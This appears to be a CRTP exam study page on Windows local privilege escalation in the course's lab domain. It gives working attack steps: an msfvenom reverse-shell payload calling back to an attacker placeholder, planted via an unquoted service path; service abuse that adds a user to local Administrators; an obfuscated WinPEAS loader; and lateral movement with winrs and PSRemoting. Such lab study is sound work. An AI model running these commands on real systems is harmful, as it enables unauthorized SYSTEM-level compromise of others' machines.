# Local Privilege Escalation

{% hint style="info" %}
The CRTP exam consists of 5 target servers in addition to a foothold student machine.\
The goal is to OS level command execution on all 5 targets not matter what the privileges of the user.
{% endhint %}

## Vectors

#### There are various ways of locally escalating privileges on Windows box:

*  **Missing patches** – Automated deployment and AutoLogon passwords in clear text
* **AlwaysInstallElevated** (Any user can run MSI as SYSTEM)
* **Misconfigured Services** – DLL Hijacking and more
* **NTLM Relaying** a.k.a. Won't Fix

This guide offer a sufficiently comprehensive overview of the course material for local privilege escalation

{% embed url="https://github.com/0xStarlight/CRTP-Notes/blob/main/2-Local-Priv-Esc/1-Local-PrivEsc.md" %}

## Tools

### PowerUp

{% embed url="https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1" %}

### WinPEAS

{% embed url="https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS" %}

### Privesc

{% embed url="https://github.com/enjoiz/Privesc" %}

### Automated checks

```powershell
# PowerUp
Import-Module PowerUp.ps1
Invoke-AllChecks

# winPEAS
winPEASx64.exe 

# Privesc
Invoke-PrivEsc
```
## Manual Check Unquoted Service Path:

#### How to Find Unquoted Service Paths using CMD:

```batch
C:\> wmic service get name,pathname,startmode | findstr /v /i system32  | findstr /v \"
```
#### Find service path location
```batch
C:\> sc qc unquotedsvc
```
#### Using accesschk.exe, note that the BUILTIN\Users group is allowed to write to the C:\Program Files\Unquoted Path Service\ directory:
```batch
C:\PrivEsc\accesschk.exe /accepteula -uwdq "C:\Program Files\Unquoted Path Service\"
```
### Generate a Reverse shell using msfvenom
```batch
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<attackerIP> LPORT=<port>  -f exe -o reverse.exe
```
### Copy the reverse.exe executable you created to this directory and rename it Common.exe:
```batch
copy C:\Users\reverse.exe "C:\Program Files\Unquoted Path Service\Common.exe"
```
### Start a listener on Kali and then start the service to spawn a reverse shell running with SYSTEM privileges:
```batch
net start unquotedsvc
```

## Services

{% tabs %}
{% tab title="PowerUp" %}
Find vulnerable service configuration

```powershell
# Get services with unquoted paths and spaces
Get-UnquotedService -Verbose

# Get services where current user can write to binary path
Get-ModifiableServiceFile -Verbose

# Get the services whose configuration current user can modify
Get-ModifiableService -Verbose
```

Add domain user to the local Administrators group

```powershell
# Get help commands
help Invoke-ServiceAbuse -Examples
# Practical use
Invoke-ServiceAbuse -Name 'AbyssWebServer' -UserName 'dcorp\studentx' -Verbose
# Verify if the above command worked or not with
net localgroup administrators
# Logoff and login again to affect changes
```
{% endtab %}

{% tab title="PowerShell" %}
Get all the service path names from where the service is executing.

```powershell
Get-WmiObject -Class win32_service | select pathname
```

Get ACLs of running service

```powershell
sc.exe sdshow <servicename>
```
{% endtab %}

## Local Privilege Escalation using Jenkins - PowerUp

{% tabs %}
{% tab title="PowerUp.ps1" %}

```batch
C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat
```
```powershell
. C:\AD\Tools\PowerUp.ps1
Invoke-AllChecks
```

### Let's use the abuse function for Invoke-ServiceAbuse and add our current domain user to the local Administrators group.
```powershell
Invoke-ServiceAbuse -Name 'AbyssWebServer' -UserName 'dcorp\studentx' -Verbose
```
### We can see that the dcorp\studentx is a local administrator now. Just logoff and logon again and we have local administrator privileges!

{% endtab %}
{% endtabs %}

## Local Privilege Escalation - WinPEAS

{% tabs %}
{% tab title="WinPEAS" %}

You can use WinPEAS using the following command. Note that we use an obfuscated version of WinPEAS:

```batch
C:\AD\Tools\Loader.exe -Path C:\AD\Tools\winPEASx64.exe -args notcolor log
```
{% endtab %}
{% endtabs %}

## Local Privilege Escalation - PrivEscCheck

{% tabs %}
{% tab title="PrivEscCheck" %}

Similarly, we can use PrivEscCheck (https://github.com/itm4n/PrivescCheck) for a nice summary of possible privilege escalation opportunities:

```powershell
. C:\AD\Tools\PrivEscCheck.ps1
Invoke-PrivescCheck
```
{% endtab %}

## Hunt for Local Admin access
### Now for the next task, to identify a machine in the domain where studentx has local administrative access, use Find-PSRemotingLocalAdminAccess.ps1:

```batch
C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat
```

```powershell
. C:\AD\Tools\Find-PSRemotingLocalAdminAccess.ps1
Find-PSRemotingLocalAdminAccess
```

### So, studentx has administrative access on dcorp-adminsrv and on the student machine. We can connect to dcorp-adminsrv using winrs as the student user:

```batch
winrs -r:dcorp-adminsrv cmd

set username

set computername
```

### We can also use PowerShell Remoting:

```powershell
Enter-PSSession -ComputerName dcorp-adminsrv.dollarcorp.moneycorp.local
$env:username
```

{% endtabs %}
